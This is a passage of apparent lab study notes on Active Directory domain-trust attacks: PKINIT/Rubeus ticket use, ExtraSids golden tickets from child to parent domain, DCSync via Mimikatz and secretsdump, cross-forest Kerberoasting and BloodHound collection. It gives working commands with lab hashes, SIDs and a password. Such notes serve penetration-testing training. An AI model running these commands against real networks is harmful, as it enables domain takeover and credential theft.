1. **Retrieve NT Hash Using Kerberos U2U:**
   - Use `getnthash.py` with the AS-REP encryption key:
     ```bash
     python3 /opt/PKINITtools/getnthash.py -key <AS-REP_Encryption_Key> <domain>/<DC_machine_account>$
     ```

2. **Perform Pass-the-Ticket with Rubeus:**
   - Request a TGT and inject it into memory:
     ```powershell
     Rubeus.exe asktgt /user:<DC_machine_account>$ /certificate:<Base64_Certificate> /ptt
     ```



### **Defensive Measures**

1. **Patch Hosts:**
   - Apply Microsoft’s **CVE-2021-36942** patch to fix the vulnerability.

2. **Harden AD CS:**
   - Require **Extended Protection for Authentication** and enable **SSL/TLS** for Web Enrollment services.

3. **Restrict NTLM:**
   - Disable NTLM on Domain Controllers, AD CS servers, and IIS hosting Web Enrollment.

4. **Monitor for Abnormal Behavior:**
   - Look for NTLM relay indicators, such as:
     - Unexpected NTLM authentication events.
     - Unusual certificate requests.

---

# Domain Trusts Primer
### Domain Trusts Overview
A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources or perform administrative tasks in another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:

- **Parent-child**: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain (e.g., `corp.inlanefreight.local`) could authenticate into the parent domain (`inlanefreight.local`), and vice-versa.
- **Cross-link**: A trust between child domains to speed up authentication.
- **External**: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
- **Tree-root**: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- **Forest**: A transitive trust between two forest root domains.
- **ESAE**: A bastion forest used to manage Active Directory.

### Trust Attributes
- **Transitive Trust**: Trust extended to objects that child domains trust. 
  - Example: If Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
- **Non-transitive Trust**: Trust limited to the child domain itself.
- **One-way Trust**: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
- **Bidirectional Trust**: Users from both trusting domains can access each other's resources.

### Trust Table Side By Side
| Transitive                             | Non-Transitive                        |
| -------------------------------------- | ------------------------------------- |
| Shared, 1 to many                      | Direct trust                          |
| Trust is shared with anyone in the forest | Not extended to next level child domains |
| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |

### Security Implications
- Incorrectly set up domain trusts can create unintended attack paths.
- Mergers & Acquisitions (M&A) may introduce risks if the security posture of acquired companies is not thoroughly assessed.
- Attackers may exploit vulnerabilities in trusted domains to gain access to the principal domain.

### Enumerating Trust Relationships
#### Using `Get-ADTrust`
```powershell
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *
```

#### Using PowerView
```powershell
# Import PowerView module
PS C:\htb> Import-Module PowerView

# Enumerate domain trusts
PS C:\htb> Get-DomainTrust 

# Perform domain trust mapping
PS C:\htb> Get-DomainTrustMapping
```

#### Using `netdom`
```cmd
# Query domain trusts
C:\htb> netdom query /domain:inlanefreight.local trust

# Query domain controllers
C:\htb> netdom query /domain:inlanefreight.local dc

# Query workstations and servers
C:\htb> netdom query /domain:inlanefreight.local workstation
```

#### Using BloodHound
- Use the "Map Domain Trusts" pre-built query to visualize domain trust relationships.

By understanding and carefully managing domain trusts, organizations can improve their security posture and reduce the risk of attacks exploiting these trust relationships.
![image](https://github.com/user-attachments/assets/e8df40a5-234d-4eba-8431-730f246356c5)

---

# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

### SID History Primer
- **Purpose**: Used in migrations to ensure users can access resources in the original domain after being moved to a new domain.
- **Attribute**: `sidHistory` stores the original user's SID in the new account's attribute.

### SID History Injection Attack
- **Tool**: Mimikatz
- **Goal**: Add an admin SID to `sidHistory` of a controlled account.
- **Result**: Grants the account administrative privileges and allows for DCSync attacks, creating Golden Tickets.

### ExtraSids Attack
- **Target**: Parent domain after compromising a child domain.
- **Vulnerability**: Lack of SID Filtering within the same AD forest.
- **Objective**: Use `sidHistory` to gain Enterprise Admin rights.

### Data Needed for ExtraSids Attack
1. KRBTGT hash for the child domain
2. SID for the child domain
3. Target user name in the child domain (can be fake)
4. FQDN of the child domain
5. SID of the Enterprise Admins group in the root domain

### Steps to Perform the Attack
1. **Obtain NT hash for KRBTGT account**:
   ```powershell
   mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
   ```

2. **Get SID for the child domain**:
   ```powershell
   PS C:\htb> Get-DomainSID
   ```

3. **Get SID for the Enterprise Admins group**:
   ```powershell
   PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
   ```

4. **Create a Golden Ticket with Mimikatz**:
   ```powershell
   mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
   ```

5. **Confirm Kerberos ticket is in memory**:
   ```powershell
   PS C:\htb> klist
   ```

### Example Before and After Attack
**Before Attack**:
```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
ls : Access is denied
```

**After Attack**:
```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Directory of \\academy-ea-dc01.inlanefreight.local\c$
```

### Rubeus Alternative
- Use Rubeus to perform the attack similarly, by formulating the Rubeus command with the required data.

### Data Needed
1. **KRBTGT hash** for the child domain: `9d765b482771505cbe97411065964d5f`
2. **SID** for the child domain: `S-1-5-21-2806153819-209893948-922872689`
3. **Target user name** in the child domain: `hacker` (can be fake)
4. **FQDN** of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
5. **SID of the Enterprise Admins group** in the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

### Steps to Perform the Attack

1. **Create a Golden Ticket with Rubeus:**
   ```powershell
   PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
   ```

2. **Output from Rubeus:**
   ```
   [*] Action: Build TGT
   [*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
   [+] Ticket successfully imported!
   ```

3. **Confirm the Ticket is in Memory Using klist:**
   ```powershell
   PS C:\htb> klist
   ```

4. **Perform a DCSync Attack to Verify Access:**
   ```powershell
   PS C:\Tools\mimikatz\x64> .\mimikatz.exe
   mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
   ```


**Notes:**
- The Rubeus command `/rc4` flag is the NT hash for the KRBTGT account.
- The `/sids` flag will tell Rubeus to create a Golden Ticket granting the same rights as members of the Enterprise Admins group in the parent domain.

---

# Attacking Domain Trusts - Child -> Parent Trusts - from Linux

**Objective:** Perform the Golden Ticket attack from a Linux attack host after compromising a child domain. The goal is to escalate privileges from the compromised child domain to the parent domain by leveraging SID history and Kerberos authentication.

### Data Needed
1. **KRBTGT hash** for the child domain
2. **SID** for the child domain
3. **Target user name** in the child domain (can be fake)
4. **FQDN** of the child domain
5. **SID of the Enterprise Admins group** in the root domain

### Steps to Perform the Attack

1. **Perform DCSync with secretsdump.py**
   - **Purpose:** To obtain the NTLM hash for the KRBTGT account in the child domain.
   - **Command:**
     ```bash
     secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
     ```
   - **Explanation:** `secretsdump.py` is used to extract the KRBTGT hash by performing a DCSync attack, which simulates the behavior of a domain controller to replicate data.

2. **Perform SID Brute Forcing using lookupsid.py**
   - **Purpose:** To find the SID of the child domain by enumerating user and group SIDs.
   - **Command:**
     ```bash
     lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
     ```

3. **Filter for the Domain SID**
   - **Purpose:** To extract only the domain SID from the output of the previous command.
   - **Command:**
     ```bash
     lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
     ```

4. **Get the Domain SID & Attach Enterprise Admin's RID**
   - **Purpose:** To obtain the SID for the Enterprise Admins group in the parent domain.
   - **Command:**
     ```bash
     lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
     ```

### Constructing a Golden Ticket

5. **Construct a Golden Ticket using ticketer.py**
   - **Purpose:** To create a Golden Ticket that grants administrative access across both the child and parent domains.
   - **Command:**
     ```bash
     ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
     ```
   - **Explanation:** `ticketer.py` generates a Kerberos TGT (Ticket Granting Ticket) for the specified user with the necessary privileges.

6. **Set the KRB5CCNAME Environment Variable**
   - **Purpose:** To use the generated ccache file for Kerberos authentication.
   - **Command:**
     ```bash
     export KRB5CCNAME=hacker.ccache
     ```
   - **Explanation:** Setting the `KRB5CCNAME` environment variable tells the system to use the specified ccache file for authentication attempts.

### Authenticating to the Parent Domain

7. **Authenticate using Impacket's version of Psexec**
   - **Purpose:** To verify access by attempting to execute commands on the parent domain's Domain Controller.
   - **Command:**
     ```bash
     psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
     ```
   - **Example Output:**
     ```bash
     C:\Windows\system32> whoami
     nt authority\system

     C:\Windows\system32> hostname
     ACADEMY-EA-DC01
     ```

### Using raiseChild.py for Automation

8. **Perform the Attack with raiseChild.py**
   - **Purpose:** To automate the escalation process from the child domain to the parent domain.
   - **Command:**
     ```bash
     raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
     ```
   - **Example Output:**
     ```bash
     C:\Windows\system32>whoami
     nt authority\system

     C:\Windows\system32>exit
     ```

### Notes on Using Automation Tools
- **Understand the Manual Process**: Always understand the manual process of gathering required data points.
- **Use Automation Tools with Caution**: Be cautious when using automation tools in a client production environment to avoid unexpected issues.
- **Avoid Blindly Using "Autopwn" Scripts**: Work with tools you fully understand to maintain control over the process.

---
# Attacking Domain Trusts - Cross-Forest Trust Abuse

## Cross-Forest Kerberoasting
Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts depending on trust direction. If positioned in a domain with an inbound or bidirectional domain/forest trust:
- Obtain a Kerberos ticket and crack a hash for an administrative user in another domain with Domain/Enterprise Admin privileges in both domains.
- Use **PowerView** to enumerate accounts with SPNs.

### Enumerate Accounts for SPNs
```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
- Target account: `mssqlsvc`
- Member of Domain Admins group

### Perform Kerberoasting with Rubeus
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
- Extract and crack the hash offline.

## Admin Password Re-Use & Group Membership
- Check for password reuse across two forests with a bidirectional forest trust.
- **PowerView** to enumerate foreign group membership.

### Using Get-DomainForeignGroupMember
```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

### Verify Access Using Enter-PSSession
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## SID History Abuse - Cross Forest
- If SID Filtering is not enabled, add a SID from one forest to a user's token when authenticating across the trust.
- This means if a user is migrated from forest A to forest B then SID history will retain SID A and then can still have priveledges in A with being in forest B

## Example of Kerberos Attack
```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Attack Summary
1. **Enumerate SPNs** in the target domain.
2. **Kerberoast** using Rubeus.
3. **Password Reuse Check** across trusted domains.
4. **Foreign Group Membership** enumeration.
5. **Access Verification** using WinRM.
6. **SID History Abuse** across forest trust (if SID Filtering is not enabled).

---

# Attacking Domain Trusts - Cross-Forest Trust Abuse from Linux

## Cross-Forest Kerberoasting
Using **GetUserSPNs.py** from a Linux attack host to perform Kerberoasting across a forest trust.

### Enumerate SPNs
```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
- Identify SPNs in the target domain.
- Example output:
  - **ServicePrincipalName**: MSSQLsvc/sql01.freightlogstics:1433
  - **Name**: mssqlsvc
  - **MemberOf**: CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL

### Request TGS Ticket
```shell
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
- Obtain TGS ticket for offline cracking.

## Hunting Foreign Group Membership with Bloodhound-python
### Setup DNS Configuration
Edit `/etc/resolv.conf` to configure DNS for the target domain.

```shell
# Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

### Run Bloodhound-python
Collect data from the target domain.

```shell
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
- Repeat for the FREIGHTLOGISTICS.LOCAL domain.

```shell
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

### Compress and Upload Data
Compress collected data to upload into the BloodHound GUI.

```shell
zip -r ilfreight_bh.zip *.json
```

### Analyze in BloodHound
- **Analysis**: Users with Foreign Domain Group Membership.
- **Source Domain**: INLANEFREIGHT.LOCAL.
